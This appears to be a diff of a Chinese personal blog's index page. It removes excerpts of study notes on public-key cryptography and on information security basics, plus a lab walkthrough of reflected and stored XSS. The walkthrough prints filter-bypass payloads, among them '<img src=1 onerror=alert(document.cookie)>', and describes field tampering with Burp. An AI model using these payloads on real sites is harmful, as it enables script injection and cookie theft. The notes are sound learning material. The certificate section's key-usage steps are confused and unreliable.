-<p>​    需要敌人拿不到数据的安全信道传递共用的密钥。</p>
-<h4 id="双钥密码体制"><a href="#双钥密码体制" class="headerlink" title="双钥密码体制"></a>双钥密码体制</h4><p><img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/信息安全概论(2" alt>\image-20220316164723920.png)</p>
-<blockquote>
-<p>加密密钥和解密密钥不相同，且不能相互推导</p>
-</blockquote>
-<p>双钥算法之一 —— RSA算法</p>
-<p><img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/信息安全概论(2" alt>\image-20220316172136374.png)</p>
-<p>加密：$c=m^e \mod {n}$</p>
-<p>解密：$c^d \mod n = m$</p>
-<blockquote>
-<p>知道加密密钥推断不出解密密钥</p>
-</blockquote>
-<p><img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/信息安全概论(2" alt>\image-20220316174502949.png)</p>
-<p>假设一个场景：A与B要进行通信，C为可能的窃听者，双钥密码体制工作如下。</p>
-<p><strong>工作流程：</strong></p>
-<ol>
-<li>由A产生加密密钥和解密密钥</li>
-<li>A将加密密钥公开出去，B和C都能接收到加密密钥。</li>
-<li>B通过加密密钥加密明文发送给A，A通过解密密钥就可以解密出明文。</li>
-</ol>
-<p>这个过程中就可以不通过安全信道传输信息他，同时通过加密密钥也不能推导出解密密钥，所以信息可以安全的传输。</p>
-<h4 id="2-3-4-双钥密码小结"><a href="#2-3-4-双钥密码小结" class="headerlink" title="2.3.4 双钥密码小结"></a>2.3.4 双钥密码小结</h4><p>两把钥匙：加密能力和解密能力是非对称的。</p>
-<p><strong>公开加密密钥：</strong></p>
-<p>目的：机密性</p>
-<p>优点：降低对安全信道的依赖</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>机密性</th>
-<th>可鉴别性</th>
-<th>完整性</th>
-<th>抗抵赖性</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>√</td>
-<td>×</td>
-<td>√</td>
-<td>×</td>
-</tr>
-</tbody>
-</table>
-</div>
-<p><strong>公开解密密钥：</strong></p>
-<p>目的：真实性</p>
-<p>优点：提供了抗抵赖的”证据“</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>机密性</th>
-<th>可鉴别性</th>
-<th>完整性</th>
-<th>抗抵赖性</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>×</td>
-<td>√</td>
-<td>√</td>
-<td>√</td>
-</tr>
-</tbody>
-</table>
-</div>
-<h4 id="2-6-1-数字签名的基本原理和物理签名的区别"><a href="#2-6-1-数字签名的基本原理和物理签名的区别" class="headerlink" title="2.6.1 数字签名的基本原理和物理签名的区别"></a><strong>2.6.1 数字签名的基本原理和物理签名的区别</strong></h4><p><strong>物理签名：</strong>基于物理载体不可伪造，通过物理载体对其上的内容负责。</p>
-<p><strong>数字签名：</strong>直接基于数据内容不可伪造，没有物理载体。</p>
-<h4 id="2-7-1-数字签名与数字证书"><a href="#2-7-1-数字签名与数字证书" class="headerlink" title="2.7.1 数字签名与数字证书"></a>2.7.1 数字签名与数字证书</h4><p><img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/信息安全概论(2" alt>\image-20220318141759531.png)</p>
-<p>我们以用户向服务器传输加密数据来阐述证书、公私钥和可信第三方的关系：</p>
-<ol>
-<li><p>可信第三方产生公私钥，用私钥对服务器信息进行加密，然后将公钥公布出去。</p>
-</li>
-<li><p>用户向服务器传输数据的时候，先用公钥对签名信息进行解密。</p>
-<blockquote>
-<p>这一步可以保证数据的真实性，因为是可信第三方签名认证的。</p>
-</blockquote>
-</li>
-<li><p>接着服务器通过公开的加密私钥对数据进行加密，将数据传输给服务器。</p>
-<blockquote>
-<p>这一步可以保证数据的机密性，用这个公钥给服务器发送的机密数据，只有服务器可以解开。</p>
-</blockquote>
-</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://wuyuesong.github.io/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wys的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA/" class="post-title-link" itemprop="url">信息安全概论（1）</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-03-16 15:57:27 / Modified: 21:35:08" itemprop="dateCreated datePublished" datetime="2022-03-16T15:57:27+08:00">2022-03-16</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="信息安全概论（1）"><a href="#信息安全概论（1）" class="headerlink" title="信息安全概论（1）"></a>信息安全概论（1）</h1><h2 id="1-1-1安全风险分析与安全对策"><a href="#1-1-1安全风险分析与安全对策" class="headerlink" title="1.1.1安全风险分析与安全对策"></a>1.1.1安全风险分析与安全对策</h2><h2 id="安全分析"><a href="#安全分析" class="headerlink" title="安全分析"></a>安全分析</h2><p>要保护对象的<strong>价值、弱点、威胁</strong></p>
-<h3 id="安全对策（PDRRP）"><a href="#安全对策（PDRRP）" class="headerlink" title="安全对策（PDRRP）"></a>安全对策（<strong>PDRR</strong>P）</h3><ul>
-<li><strong>保护</strong></li>
-<li><strong>检测</strong></li>
-<li><strong>反应</strong></li>
-<li><strong>恢复</strong></li>
-<li>惩罚</li>
-</ul>
-<h2 id="1-2-1-可用性、真实性、机密性"><a href="#1-2-1-可用性、真实性、机密性" class="headerlink" title="1.2.1 可用性、真实性、机密性"></a>1.2.1 可用性、真实性、机密性</h2><h3 id="信息的可用性"><a href="#信息的可用性" class="headerlink" title="信息的可用性"></a>信息的可用性</h3><p>信息系统提供服务的能力</p>
-<blockquote>
-<ul>
-<li>病毒导致的计算机系统瘫痪</li>
-<li>蠕虫导致网络堵塞瘫痪</li>
-<li>黑客进行的拒绝服务攻击</li>
-</ul>
-</blockquote>
-<h3 id="信息的真实性"><a href="#信息的真实性" class="headerlink" title="信息的真实性"></a>信息的真实性</h3><ul>
-<li><p>可鉴别性</p>
-<blockquote>
-<p>是周瑜发给我的还是曹操发给我的</p>
-</blockquote>
-</li>
-<li><p>完整性</p>
-<blockquote>
-<p>是不是发送过程中被改了</p>
-</blockquote>
-</li>
-<li><p>抗抵赖 (面对双方不可信的条件下,提供保障)</p>
-</li>
-</ul>
-<h3 id="信息的机密性"><a href="#信息的机密性" class="headerlink" title="信息的机密性"></a>信息的机密性</h3><p>9月14日组织进攻</p>
-<p><img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA/image-20220316094317271.png" alt></p>
-<h2 id="1-3-1-信息安全模型"><a href="#1-3-1-信息安全模型" class="headerlink" title="1.3.1 信息安全模型"></a>1.3.1 信息安全模型</h2><p>信息安全模型：信息在传输、存储和处理过程中保护信息的<strong>CIA</strong></p>
-<blockquote>
-<p>机密性：Confidentiality</p>
-<p>完整性：Integrity</p>
-<p>可用性 ：Availability</p>
-</blockquote>
-<h2 id="1-4-1-信息时代和信息的价值"><a href="#1-4-1-信息时代和信息的价值" class="headerlink" title="1.4.1 信息时代和信息的价值"></a>1.4.1 信息时代和信息的价值</h2><p><strong>数据</strong> ： 客观事物的符号表示。</p>
-<p><strong>信息</strong> ：有用的数据，能消除主体疑问的数据，能指导主体的行为的数据。</p>
-<ul>
-<li>数据是信息的载体，但信息不等于数据。</li>
-<li>数据中包含信息，但得到数据未必能得到信息，即能指导主体行为。</li>
-</ul>
-<h2 id="1-5-1-信息系统的弱点"><a href="#1-5-1-信息系统的弱点" class="headerlink" title="1.5.1 信息系统的弱点"></a>1.5.1 信息系统的弱点</h2><ol>
-<li>设计上的问题——通常缺乏安全的考虑，比如 $arp$ 病毒。</li>
-<li>实现上的问题——代码编写中，有意后门和无意的bug。</li>
-<li>配置上的问题——默认的服务。</li>
-<li>管理上的问题——弱的口令，内部人员无意或恶意的操作。</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://wuyuesong.github.io/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wys的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">XSS笔记</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-03-08 10:27:27" itemprop="dateCreated datePublished" datetime="2022-03-08T10:27:27+08:00">2022-03-08</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-03-16 21:35:08" itemprop="dateModified" datetime="2022-03-16T21:35:08+08:00">2022-03-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="XSS笔记"><a href="#XSS笔记" class="headerlink" title="XSS笔记"></a>XSS笔记</h1><h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308095657142.png" alt></p>
-<blockquote>
-<p>反射型XSS只会中招一次，存储型XSS每次打开都会中招，很烦人。DOM型XSS接触的不多。</p>
-</blockquote>
-<h2 id="反射型XSS漏洞"><a href="#反射型XSS漏洞" class="headerlink" title="反射型XSS漏洞"></a>反射型XSS漏洞</h2><h3 id="低等级"><a href="#低等级" class="headerlink" title="低等级"></a>低等级</h3><p>代码直接引用了name参数，并没有做任何过滤和检查，存在明显的XSS漏洞。</p>
-<p>在对话框键入<code>&lt;script&gt;alert(&quot;111&quot;)&lt;/script&gt;</code> 就完成了一次低等级的XSS攻击。</p>
-<p>可以看到浏览器上方弹出</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308100719863.png" alt></p>
-<h3 id="中等级"><a href="#中等级" class="headerlink" title="中等级"></a>中等级</h3><p> 观察代码发现对输入的数据进行的过滤，将script关键词删除，但是这种机制很容易被绕过。</p>
-<ol>
-<li>这时我们可以通过输入<code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;</code> 伪装外部的<code>&lt;script&gt;</code> 进行攻击。</li>
-</ol>
-<p>可以看到浏览器成功弹窗</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308101757917.png" alt></p>
-<ol>
-<li>我们还可以通过混用大小写的方式进行XSS攻击</li>
-</ol>
-<p>我们输入<code>&lt;ScriPt&gt;alert(111)&lt;/script&gt;</code> ，点击$submit$ 进行提交也可以看到成功弹窗。</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308102802413.png" alt></p>
-<p>​         </p>
-<h3 id="高等级"><a href="#高等级" class="headerlink" title="高等级"></a>高等级</h3><p>观察代码发现使用黑名单过滤输入，其中preg_replace()函数用于正则表达式的搜索和替换，这使双写绕过和大小写混写绕过全部失效。</p>
-<p>我们可以通过 $img$ , $body$ 等标签注入js代码。</p>
-<p>我们在对话框中输入代码： <code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code></p>
-<p>提交后可以看到成功进行了弹窗</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308111137012.png" alt></p>
-<h2 id="存储型XSS漏洞"><a href="#存储型XSS漏洞" class="headerlink" title="存储型XSS漏洞"></a>存储型XSS漏洞</h2><h3 id="低等级-1"><a href="#低等级-1" class="headerlink" title="低等级"></a>低等级</h3><p>strip_tags()函数可以剥去字符串中的HTML，XML以及PHP的标签，但允许使用标签。  addslashes()函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加 反斜杠的字符串。 可以看到，由于对message参数使用了htmlspecialchars函数进行编码，无法在使用 message参数注入XSS代码，但是对于name参数，只是简单过滤了标签，所以仍存在存储型的XSS 。</p>
-<h4 id="在message进行xss攻击"><a href="#在message进行xss攻击" class="headerlink" title="在message进行xss攻击"></a>在message进行xss攻击</h4><p>在message栏输入<code>&lt;script&gt;alert(&quot;/xss/&quot;)&lt;/script&gt;</code></p>
-<p>可以看到浏览器上方弹出</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308155737502.png" alt></p>
-<h4 id="在name进行xss攻击"><a href="#在name进行xss攻击" class="headerlink" title="在name进行xss攻击"></a>在name进行xss攻击</h4><p>由于name进行了输入字数的限制，我们用burp进行抓包。</p>
-<p>在name栏输入123，message栏输入123。在burp中的proxy栏打开intercept is on进行抓包。</p>
-<p>抓包结果如下：</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308160339068.png" alt></p>
-<p>将txtname改为<code>&lt;script&gt;alert(&quot;/xss/&quot;)&lt;/script&gt;</code>，放开包，发现浏览器成功弹窗。</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308155737502.png" alt></p>
-<h3 id="中等级-1"><a href="#中等级-1" class="headerlink" title="中等级"></a>中等级</h3><p>基于黑名单思想，使用str_replace()函数，将script关键词删除，但是这种机制是很容易绕过去的。</p>
-<p>同理用burp进行抓包</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308163010214.png" alt></p>
-<p>将message改为 <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;</code></p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308101757917.png" alt></p>
-<p>可以看到成功弹窗</p>
-<h3 id="高等级-1"><a href="#高等级-1" class="headerlink" title="高等级"></a>高等级</h3><p>同理进行抓包</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308163311721.png" alt>改为 <code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code></p>
-<p>放包可以看到成功进行了弹窗</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308111137012.png" alt></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1265,14 +1088,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">45</span>
+          <span class="site-state-item-count">49</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
   </nav>
@@ -1299,7 +1122,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2022</span>
+  <span itemprop="copyrightYear">2023</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
